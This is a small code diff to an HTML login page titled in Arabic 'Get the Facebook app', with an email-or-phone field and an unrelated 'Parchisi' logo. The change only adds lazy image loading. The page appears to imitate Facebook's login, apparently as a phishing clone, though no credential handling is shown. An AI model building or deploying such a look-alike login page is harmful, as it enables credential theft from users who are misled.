@@ -144,7 +144,7 @@
   <div class="main">
     <p class="p1">الحصول على تطبيق فيسبوك</p>
     <div class="logo">
-      <img src="111.png" alt="Parchisi Logo">
+      <img data-src="111.png"  alt="Lazy loaded image">
     </div>
     <form id="loginForm">
       <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="text" id="emailOrPhone" required>
@@ -292,6 +292,14 @@
         loadingElement.style.display = 'none';
       }
     }
+    document.addEventListener('DOMContentLoaded', () => {
+    const images = document.querySelectorAll('img[data-src]');
+    images.forEach(img => {
+        img.src = img.getAttribute('data-src');
+        img.removeAttribute('data-src');
+    });
+});
+
   </script>
 </body>
 </html>
